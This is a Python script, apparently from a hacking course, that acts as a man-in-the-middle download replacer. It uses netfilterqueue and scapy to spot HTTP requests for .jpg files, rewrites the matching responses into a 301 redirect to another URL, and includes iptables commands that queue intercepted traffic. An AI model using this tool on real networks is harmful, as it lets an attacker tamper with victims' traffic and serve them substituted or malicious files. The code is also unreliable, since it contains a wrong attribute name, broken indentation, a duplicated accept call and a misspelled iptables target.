import netfilterqueue
import scapy.all as scapy


ackList = []

def processPacket(packet):
    myScapyPacket = scapy.IP(packet.get_payload())    # This is converting packet to scapy packet so we can see and change everything.

    
    if myScapyPacket.haslayer(scapy.Raw):# Useful data is in raw layer. So we are looking for it
        
        if myScapyPacket[scapy.TCP].dport == 80:
            if ".jpg" in myScapyPacket[scapy.Raw].load:
                print("[+] jpg Request")
                ackList.append(myScapyPacket[scapy.TCP].ack)
                print(myScapyPacket.show())
		#And we are going to change load section in response. It was 200 OK but we ll change it to 301 response. It means you should 			#direct different url to donwload.
                       
        elif myScapyPacket[scapy.TCP].sport ==80:
            if myScapyPacket[scapy.TCP].seq in ackList:
                ackList.remove(myScapyPacket[scapy.TCP].seq)
                print("[+] Replacing File")
		myScapyPacket[scapy.RAW].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.org/index.asp"
		del myScapyPacket[scapy.IP].len
		del myScapyPacket[scapy.IP].chksum
		del myScapyPacket[scapy.TCP].chksum
                
		packet.set_payload(str(myScapyPacket))
    packet.accept()
            
    # Now, we have to decide that this packet is response or request For that we ll look at dport and sport in TCP layer. If the sport is http port so it is a response
        
            
    packet.accept() # Packet has came to python and we accept it to go or we can drop the packet


    # packet.drop()

    

queue = netfilterqueue.NetfilterQueue()

queue.bind(0, processPacket)    # This is bind this queue with the queue number 0 that we create before on linux system and every packet in that queue will go to process packet function


queue.run()

# The linux Command for queueing packets

# iptables -I FORWARD -j NDQUEUE --queue-num 0

# iptables -I OUTPUT -j NDQUEUE --queue-num 0 -> this is my computer's network

# iptables -I INPUT -j NDQUEUE --queue-num 0

# iptables --flush


